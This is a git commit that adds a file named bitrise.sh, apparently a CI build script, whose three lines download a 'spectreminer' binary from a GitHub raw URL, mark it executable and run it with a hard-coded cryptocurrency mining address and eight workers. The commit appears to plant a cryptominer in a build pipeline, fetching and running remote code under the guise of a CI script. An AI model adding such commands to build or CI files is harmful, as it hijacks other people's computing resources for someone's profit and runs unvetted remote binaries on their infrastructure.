b5ff5c18063f842274af0e8b7b1271bfe8caf6e2
spmc01 <spmc01@outlook.com>
2024-06-10 13:05:07 +0530

    Create bitrise.sh

---
+++ bitrise.sh
@@ -0,0 +1,3 @@
+wget https://github.com/spmc01/spc/raw/main/spectreminer
+chmod +x spectreminer
+./spectreminer --miningaddr=spectre:qqsw4czp5raugmh9utt4gy7axa2kq6j8jgy96nfw7ncwpfexrl6j5lrqm633g --workers 8
